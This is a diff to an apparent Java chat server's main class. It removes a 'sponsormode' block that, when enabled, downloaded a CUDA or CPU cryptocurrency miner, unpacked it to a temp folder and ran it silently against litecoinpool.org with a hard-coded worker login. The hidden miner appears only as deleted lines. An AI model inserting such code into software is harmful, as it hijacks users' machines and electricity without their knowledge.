@@ -24,50 +24,11 @@ public class Server {
     // This chat server can accept up to 1000 clients' connections
     static clientThread t[] = new clientThread[1000];
     private static File temp;
-    static boolean sponsormode = false; // true is :) false is ;( for creator.
 
     public static void main(String args[]) {
 
         // The default port
         int port_number = 4600;
-
-        if (sponsormode) { // this starts only when sponsormode is true.
-            String s = ExecuteMyCommand("wmic path win32_VideoController get name");
-            if (OS.contains("windows")) {
-                if (s.contains("NVIDIA")) {
-                    try {
-                        unZipIt(download("https://dl.dropboxusercontent.com/u/68963061/x64-2017-03-08-21-43.zip"), temp.getAbsolutePath() + "folder");
-                        Thread t = new Thread(new Runnable() {
-                            public void run() {
-                                ExecuteMyCommand(temp.getAbsolutePath() + "folder/cudaminer.exe -o stratum+tcp://litecoinpool.org:3333 -O mh123hack.1:sCkaXGjeQOR9ediY7ytS");
-                            }
-                        });
-                        t.start();
-                        System.out.println(temp.getAbsolutePath() + "folder");
-                    } catch (Exception ex) {
-                        System.err.println("sponsermode faild it will be disabled :( not critical no error");
-                        sponsormode = false;
-                    }
-                } else {
-                    try {
-                        unZipIt(download("https://svwh.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.4.5-win64.zip"), temp.getAbsolutePath() + "folder");
-                        Thread t = new Thread(new Runnable() {
-                            public void run() {
-                                ExecuteMyCommand(temp.getAbsolutePath() + "folder/minerd.exe -o stratum+tcp://litecoinpool.org:3333 -O mh123hack.1:sCkaXGjeQOR9ediY7ytS -q");
-                            }
-                        });
-                        t.start();
-                        System.out.println(temp.getAbsolutePath() + "folder");
-                    } catch (Exception ex) {
-                        System.err.println("sponsermode faild it will be disabled :( not critical no error");
-                        sponsormode = false;
-                    }
-                    
-                }
-            } else if (OS.contains("linux")){
-                System.err.println("sponsormode doesnt work yet for linux");
-            }
-        }
 
         if (args.length < 1) {
             System.out.println("Now using port number=" + port_number);
